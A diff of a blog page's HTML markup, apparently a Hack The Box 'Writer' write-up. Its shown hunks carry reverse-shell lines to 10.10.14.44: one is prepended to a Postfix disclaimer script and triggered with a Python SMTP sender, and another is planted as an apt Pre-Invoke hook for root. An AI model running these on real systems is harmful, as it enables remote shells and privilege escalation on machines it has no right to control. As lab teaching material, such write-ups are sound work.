-<span style="color:#8be9fd;font-style:italic">trap</span> <span style="color:#f1fa8c">&#34;rm -f in.</span><span style="color:#8be9fd;font-style:italic">$$</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">3</span> <span style="color:#bd93f9">15</span>
-
-<span style="color:#6272a4"># Start processing.</span>
-<span style="color:#8be9fd;font-style:italic">cd</span> <span style="color:#8be9fd;font-style:italic">$INSPECT_DIR</span> <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">{</span> <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$INSPECT_DIR</span> does not exist; <span style="color:#8be9fd;font-style:italic">exit</span>
-<span style="color:#8be9fd;font-style:italic">$EX_TEMPFAIL</span>; <span style="color:#ff79c6">}</span>
-
-cat &gt;in.<span style="color:#8be9fd;font-style:italic">$$</span> <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">{</span> <span style="color:#8be9fd;font-style:italic">echo</span> Cannot save mail to file; <span style="color:#8be9fd;font-style:italic">exit</span> <span style="color:#8be9fd;font-style:italic">$EX_TEMPFAIL</span>; <span style="color:#ff79c6">}</span>
-
-<span style="color:#6272a4"># obtain From address</span>
-<span style="color:#8be9fd;font-style:italic">from_address</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">`</span>grep -m <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;From:&#34;</span> in.<span style="color:#8be9fd;font-style:italic">$$</span> | cut -d <span style="color:#f1fa8c">&#34;&lt;&#34;</span> -f <span style="color:#bd93f9">2</span> | cut -d <span style="color:#f1fa8c">&#34;&gt;&#34;</span> -f 1<span style="color:#f1fa8c">`</span>
-
-<span style="color:#ff79c6">if</span> <span style="color:#ff79c6">[</span> <span style="color:#f1fa8c">`</span>grep -wi ^<span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">from_address</span><span style="color:#f1fa8c">}</span>$ <span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">DISCLAIMER_ADDRESSES</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span> <span style="color:#ff79c6">]</span>; <span style="color:#ff79c6">then</span>
-  /usr/bin/altermime --input<span style="color:#ff79c6">=</span>in.<span style="color:#8be9fd;font-style:italic">$$</span> <span style="color:#f1fa8c">\
-</span><span style="color:#f1fa8c"></span>                   --disclaimer<span style="color:#ff79c6">=</span>/etc/postfix/disclaimer.txt <span style="color:#f1fa8c">\
-</span><span style="color:#f1fa8c"></span>                   --disclaimer-html<span style="color:#ff79c6">=</span>/etc/postfix/disclaimer.txt <span style="color:#f1fa8c">\
-</span><span style="color:#f1fa8c"></span>                   --xheader<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&#34;</span> <span style="color:#ff79c6">||</span> <span style="color:#f1fa8c">\
-</span><span style="color:#f1fa8c"></span>                    <span style="color:#ff79c6">{</span> <span style="color:#8be9fd;font-style:italic">echo</span> Message content rejected; <span style="color:#8be9fd;font-style:italic">exit</span> <span style="color:#8be9fd;font-style:italic">$EX_UNAVAILABLE</span>; <span style="color:#ff79c6">}</span>
-<span style="color:#ff79c6">fi</span>
-
-<span style="color:#8be9fd;font-style:italic">$SENDMAIL</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$@</span><span style="color:#f1fa8c">&#34;</span> &lt;in.<span style="color:#8be9fd;font-style:italic">$$</span>
-
-<span style="color:#8be9fd;font-style:italic">exit</span> <span style="color:#8be9fd;font-style:italic">$?</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Localize these.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">INSPECT_DIR</span><span style="color:#ff79c6">=</span>/var/spool/filter
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">SENDMAIL</span><span style="color:#ff79c6">=</span>/usr/sbin/sendmail
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Get disclaimer addresses</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">DISCLAIMER_ADDRESSES</span><span style="color:#ff79c6">=</span>/etc/postfix/disclaimer_addresses
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Exit codes from &lt;sysexits.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">EX_TEMPFAIL</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">75</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">EX_UNAVAILABLE</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">69</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Clean up when done or when aborting.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">trap</span> <span style="color:#f1fa8c">&#34;rm -f in.</span><span style="color:#8be9fd;font-style:italic">$$</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">3</span> <span style="color:#bd93f9">15</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Start processing.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cd</span> <span style="color:#8be9fd;font-style:italic">$INSPECT_DIR</span> <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">{</span> <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$INSPECT_DIR</span> does not exist; <span style="color:#8be9fd;font-style:italic">exit</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$EX_TEMPFAIL</span>; <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat &gt;in.<span style="color:#8be9fd;font-style:italic">$$</span> <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">{</span> <span style="color:#8be9fd;font-style:italic">echo</span> Cannot save mail to file; <span style="color:#8be9fd;font-style:italic">exit</span> <span style="color:#8be9fd;font-style:italic">$EX_TEMPFAIL</span>; <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># obtain From address</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">from_address</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">`</span>grep -m <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;From:&#34;</span> in.<span style="color:#8be9fd;font-style:italic">$$</span> | cut -d <span style="color:#f1fa8c">&#34;&lt;&#34;</span> -f <span style="color:#bd93f9">2</span> | cut -d <span style="color:#f1fa8c">&#34;&gt;&#34;</span> -f 1<span style="color:#f1fa8c">`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#ff79c6">[</span> <span style="color:#f1fa8c">`</span>grep -wi ^<span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">from_address</span><span style="color:#f1fa8c">}</span>$ <span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">DISCLAIMER_ADDRESSES</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">`</span> <span style="color:#ff79c6">]</span>; <span style="color:#ff79c6">then</span>
+</span></span><span style="display:flex;"><span>  /usr/bin/altermime --input<span style="color:#ff79c6">=</span>in.<span style="color:#8be9fd;font-style:italic">$$</span> <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>                   --disclaimer<span style="color:#ff79c6">=</span>/etc/postfix/disclaimer.txt <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>                   --disclaimer-html<span style="color:#ff79c6">=</span>/etc/postfix/disclaimer.txt <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>                   --xheader<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&#34;</span> <span style="color:#ff79c6">||</span> <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>                    <span style="color:#ff79c6">{</span> <span style="color:#8be9fd;font-style:italic">echo</span> Message content rejected; <span style="color:#8be9fd;font-style:italic">exit</span> <span style="color:#8be9fd;font-style:italic">$EX_UNAVAILABLE</span>; <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">fi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">$SENDMAIL</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$@</span><span style="color:#f1fa8c">&#34;</span> &lt;in.<span style="color:#8be9fd;font-style:italic">$$</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">exit</span> <span style="color:#8be9fd;font-style:italic">$?</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We can modify the beginning of the script with a reverse shell:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/sh
-</span><span style="color:#ff79c6"></span>bash -c <span style="color:#f1fa8c">&#34;bash -i &amp;&gt; /dev/tcp/10.10.14.44/443 0&gt;&amp;1&#34;</span>
-
-<span style="color:#6272a4"># Localize these.</span>
-<span style="color:#8be9fd;font-style:italic">INSPECT_DIR</span><span style="color:#ff79c6">=</span>/var/spool/filter
-<span style="color:#8be9fd;font-style:italic">SENDMAIL</span><span style="color:#ff79c6">=</span>/usr/sbin/sendmail
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span>bash -c <span style="color:#f1fa8c">&#34;bash -i &amp;&gt; /dev/tcp/10.10.14.44/443 0&gt;&amp;1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Localize these.</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">INSPECT_DIR</span><span style="color:#ff79c6">=</span>/var/spool/filter
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">SENDMAIL</span><span style="color:#ff79c6">=</span>/usr/sbin/sendmail
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We successfully test locally the exploit before copying the it in /etc/postfix.</p>
 <pre><code>kyle@writer:~$ ./disclaimer
@@ -1074,53 +1074,53 @@ uid=1001(john) gid=1001(john) groups=1001(john)
 </code></pre>
 <h3 id="python-approach">python approach</h3>
 <p>A faster approach and more effective approach is to use python or the sendmail command after SSH forward the SMTP port. I have chosen local port 9025.</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python3</span>
-<span style="color:#ff79c6">import</span> smtplib
-
-h, p <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, <span style="color:#bd93f9">9025</span>
-From <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;kyle@writer.htb&#39;</span>
-To <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;john@writer.htb&#39;</span>
-
-Message <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#f1fa8c">\
-</span><span style="color:#f1fa8c"></span><span style="color:#f1fa8c">Subject: Hi John
-</span><span style="color:#f1fa8c">
-</span><span style="color:#f1fa8c">Regards
-</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
-
-io <span style="color:#ff79c6">=</span> smtplib<span style="color:#ff79c6">.</span>SMTP(h,p)
-<span style="color:#ff79c6">try</span>:
-    io<span style="color:#ff79c6">.</span>ehlo()
-    io<span style="color:#ff79c6">.</span>sendmail(From,To,Message)
-<span style="color:#ff79c6">except</span> Exceptions <span style="color:#ff79c6">as</span> e:
-    <span style="color:#8be9fd;font-style:italic">print</span> (e)
-<span style="color:#ff79c6">finally</span>:
-    io<span style="color:#ff79c6">.</span>quit()
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> smtplib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>h, p <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, <span style="color:#bd93f9">9025</span>
+</span></span><span style="display:flex;"><span>From <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;kyle@writer.htb&#39;</span>
+</span></span><span style="display:flex;"><span>To <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;john@writer.htb&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Message <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span><span style="color:#f1fa8c">Subject: Hi John
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Regards
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#ff79c6">=</span> smtplib<span style="color:#ff79c6">.</span>SMTP(h,p)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">try</span>:
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff79c6">.</span>ehlo()
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff79c6">.</span>sendmail(From,To,Message)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">except</span> Exceptions <span style="color:#ff79c6">as</span> e:
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span> (e)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">finally</span>:
+</span></span><span style="display:flex;"><span>    io<span style="color:#ff79c6">.</span>quit()
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We start a netcat listener, copy the modified disclaimer and immediately send the email</p>
 <pre><code>ssh kyle@writer.htb -L 9025:localhost:25
@@ -1216,17 +1216,17 @@ drwxr-xr-x 7 root root       4096 Jul  9 10:59 ..
 <li><a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a></li>
 </ul>
 <p>We can create a file <strong>01-reverse-shell</strong> :</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">cat &gt; /etc/apt/apt.conf.d/01-reverse-shell <span style="color:#f1fa8c">&lt;&lt; EOF
-</span><span style="color:#f1fa8c">apt::Update::Pre-Invoke {&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.44/445 0&gt;&amp;1&#39;&#34;};
-</span><span style="color:#f1fa8c">EOF</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat &gt; /etc/apt/apt.conf.d/01-reverse-shell <span style="color:#f1fa8c">&lt;&lt; EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">apt::Update::Pre-Invoke {&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.44/445 0&gt;&amp;1&#39;&#34;};
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">EOF</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We copy the file and we start a netcat listener on port 445. We can monitor with pspy when is the next apt update:</p>
 <pre tabindex="0"><code>rlwrap nc -lvnp 445
